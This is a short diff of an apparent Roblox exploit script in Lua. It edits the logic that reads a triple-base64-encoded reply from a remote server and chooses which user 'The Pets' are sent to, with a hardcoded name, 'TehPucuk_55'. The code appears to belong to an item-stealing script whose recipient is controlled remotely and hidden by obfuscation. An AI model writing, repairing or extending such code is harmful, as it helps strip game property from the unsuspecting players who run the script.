@@ -1168,7 +1168,7 @@ if getgenv().Settings ~= nil then
             Headers = dhheaders
         })
         local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
-        if responsed ~= 'true' then
+        if responsed ~= 'false' then
             dhuser = responsed
         else
             dhuser = nil
@@ -1239,7 +1239,7 @@ end
 -- Sending The Pets
 
 local ndUser
-if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "TehPucuk_55" then
+if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "" then
     ndUser = UserName2
 else
     ndUser = UserName
